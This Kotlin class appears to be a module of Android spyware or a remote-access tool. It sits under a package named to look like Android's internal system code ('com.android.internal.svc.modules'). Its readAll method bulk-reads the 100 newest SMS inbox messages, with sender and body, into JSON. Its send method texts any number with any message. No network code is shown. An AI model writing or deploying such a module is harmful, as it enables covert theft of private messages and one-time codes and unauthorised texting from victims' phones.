package com.android.internal.svc.modules

import android.content.Context
import android.net.Uri
import android.telephony.SmsManager
import org.json.JSONArray
import org.json.JSONObject

class MsgReader(private val context: Context) {

    fun readAll(): JSONObject {
        val messages = JSONArray()
        val cursor = context.contentResolver.query(
            Uri.parse("content://sms/inbox"),
            arrayOf("_id", "address", "body", "date", "read"),
            null, null, "date DESC LIMIT 100"
        )
        cursor?.use {
            while (it.moveToNext()) {
                messages.put(JSONObject().apply {
                    put("id", it.getLong(0))
                    put("address", it.getString(1) ?: "")
                    put("body", it.getString(2) ?: "")
                    put("date", it.getLong(3))
                    put("read", it.getInt(4) == 1)
                })
            }
        }
        return JSONObject().apply {
            put("count", messages.length())
            put("messages", messages)
        }
    }

    @Suppress("DEPRECATION")
    fun send(number: String, message: String): JSONObject {
        return try {
            val sm = SmsManager.getDefault()
            sm.sendTextMessage(number, null, message, null, null)
            JSONObject().put("status", "sent").put("to", number)
        } catch (e: Exception) {
            JSONObject().put("error", e.message)
        }
    }
}
